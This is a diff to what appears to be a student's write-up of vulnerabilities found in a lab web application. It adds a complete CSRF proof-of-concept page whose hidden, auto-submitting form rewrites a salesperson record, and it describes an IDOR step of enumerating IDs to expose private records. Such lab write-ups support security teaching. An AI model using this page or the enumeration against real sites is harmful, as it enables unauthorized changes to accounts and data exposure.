@@ -49,6 +49,38 @@ Vulnerability #1: Cross-Site Request Forgery (CSRF)
 
 <img src="red - CSRF.gif" width="800">
 
+- The HTML file that I used was: 
+
+`<!DOCTYPE html>
+        <html>
+    <head>
+        <title>Your Feedback</title>
+        <script src="https://code.jquery.com/jquery-3.2.1.min.js"></script>
+    </head>
+    <body>
+
+        <p>rip</p>
+        <style>
+        .hide-form {
+            display: none;
+        }
+        </style>
+        <form action="https://35.225.89.208/red/public/staff/salespeople/edit.php?id=7" method="POST" class="hide-form" id="attackform"  name="form">
+            <input type="text" name="first_name" value="Aaron" /><br />
+            <input type="text" name="last_name" value="Bloomfield" /><br />
+            <input type="text" name="phone" value="111-222-3333" /><br />
+            <input type="text" name="email" value="fakeemail@mail.com" /><br />
+        </form>
+        <script>
+        $(function() {
+            console.log("loaded");
+            window.document.forms[0].submit(function(e) {
+                console.log("submitted");
+            });
+        });
+        </script>
+</html>`
+
 Vulnerability #2: Insecure Direct Object Reference (IDOR)
 
 - Changed the id field in `https://35.225.89.208/green/public/staff/salespeople/show.php?id=10`. If you enumerate it past 9, you get salespeople that should not be public.
